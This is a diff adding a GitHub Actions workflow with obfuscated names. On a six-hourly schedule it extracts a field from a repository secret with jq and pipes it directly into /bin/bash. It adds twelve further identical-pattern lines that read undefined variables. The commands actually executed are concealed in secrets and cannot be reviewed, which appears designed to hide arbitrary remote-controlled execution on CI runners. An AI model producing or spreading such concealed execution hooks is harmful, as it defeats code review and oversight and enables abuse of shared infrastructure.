@@ -1,0 +1,30 @@
+name: liminxiongsan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liminxiongsan
+        env:
+          dq9: ${{ secrets.dq9 }}
+        run: |
+          echo $dq9 | jq -r .y79 | /bin/bash
+          echo $zyn886 | jq -r .pgdd67 | /bin/bash
+          echo $w27 | jq -r .qckpl0145 | /bin/bash
+          echo $yxv38 | jq -r .n17 | /bin/bash
+          echo $fgell0852 | jq -r .i90610 | /bin/bash
+          echo $hwx21619 | jq -r .bfep6603 | /bin/bash
+          echo $knl76988 | jq -r .pnm2133 | /bin/bash
+          echo $wd8748 | jq -r .q8 | /bin/bash
+          echo $ms793 | jq -r .iin35692 | /bin/bash
+          echo $u80 | jq -r .fdsx8339 | /bin/bash
+          echo $bk85 | jq -r .ldn1718 | /bin/bash
+          echo $fi1 | jq -r .fwr141 | /bin/bash
+          echo $hiji74 | jq -r .nas401 | /bin/bash
+
